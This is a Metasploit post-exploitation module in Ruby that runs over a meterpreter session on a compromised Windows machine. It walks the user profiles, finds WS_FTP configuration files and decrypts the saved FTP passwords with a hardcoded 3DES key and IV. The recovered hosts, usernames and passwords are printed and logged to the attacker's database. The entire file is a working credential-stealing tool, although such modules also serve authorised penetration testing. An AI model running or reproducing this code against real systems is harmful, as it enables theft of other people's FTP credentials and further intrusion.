# $Id$

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'rex/parser/ini'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather WS_FTP Saved Password Extraction',
				'Description'   => %q{ This module extracts weakly encrypted saved FTP Passwords 
					from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file. },
				'License'       => MSF_LICENSE,
				'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def run
		print_status("Checking Default Locations...")
		os = session.sys.config.sysinfo['OS']
		drive = session.fs.file.expand_path("%SystemDrive%")

		if os =~ /Windows 7|Vista|2008/
			@appdata = '\\AppData\\Roaming\\'
			@users = drive + '\\Users'
		else
			@appdata = '\\Application Data\\'
			@users = drive + '\\Documents and Settings'
		end

		get_users
		@userpaths.each do |path|
			check_appdata(path)
		end
	end

	def check_appdata(path)
		filename = "#{path}#{@appdata}\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini"
		begin
			iniexists = client.fs.file.stat(filename)
			print_status("Found File at #{filename}")
			get_ini(filename)
		rescue
			print_status("#{filename} not found ....")
		end
	end

	def get_users
		@userpaths = []
		session.fs.dir.foreach(@users) do |path|
			next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
			@userpaths << "#{@users}\\#{path}\\"
		end
	end

	def get_ini(filename)
		config = client.fs.file.new(filename, 'r')
		parse = config.read
		ini = Rex::Parser::Ini.from_s(parse)

		ini.each_key do |group|
			next if group == "_config_"
			print_status("Processing Saved Session #{group}")
			host = ini[group]['HOST']
			host = host.delete "\""
			username = ini[group]['UID']
			username = username.delete "\""
			port = 	ini[group]['PORT']
			passwd = ini[group]['PWD']
			passwd = decrypt(passwd)

			next if passwd == nil or passwd == ""
			port = 21 if port == nil
			print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
			report_auth_info(
						:host  => host,
						:port => port,
						:sname => 'FTP',
						:user => username,
						:pass => passwd)
		end
	end

	def decrypt(pwd)
		decoded = pwd.unpack("m*")[0]
		key = "\xE1\xF0\xC3\xD2\xA5\xB4\x87\x96\x69\x78\x4B\x5A\x2D\x3C\x0F\x1E\x34\x12\x78\x56\xab\x90\xef\xcd"
		iv = "\x34\x12\x78\x56\xab\x90\xef\xcd"
		des = OpenSSL::Cipher::Cipher.new("des-ede3-cbc")

		des.decrypt
		des.key = key
		des.iv = iv
		result = des.update(decoded)
		final = result.split("\000")[0]
		return final
	end
end
